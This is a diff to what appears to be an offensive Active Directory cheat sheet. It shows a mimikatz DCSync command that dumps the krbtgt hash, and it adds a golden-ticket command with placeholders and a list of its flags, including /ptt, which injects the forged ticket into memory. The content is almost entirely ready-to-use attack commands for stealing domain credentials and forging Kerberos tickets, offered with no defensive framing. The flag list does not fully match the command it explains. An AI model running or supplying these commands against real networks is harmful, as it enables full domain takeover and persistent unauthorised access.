@@ -28,3 +28,19 @@ lsadump::dcsync /domain:lol.local /user:krbtgt
 
 > [!NOTE] Note
 > You can pull out any user, computer or domain controller by changing the user switch to the desired account
+
+---
+### golden ticket
+
+```powershell
+kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
+
+# where:
+- /domain – the fully qualified domain name.
+- /sid – the SID of the domain.
+- /user – username to impersonate
+- /krbtgt – NTLM password hash for  account (KRBTGT)
+/ptt to immediately inject the golden ticket into memory for use.
+- /aes128 – the AES128 key
+- /aes256 – the AES256 key
+```
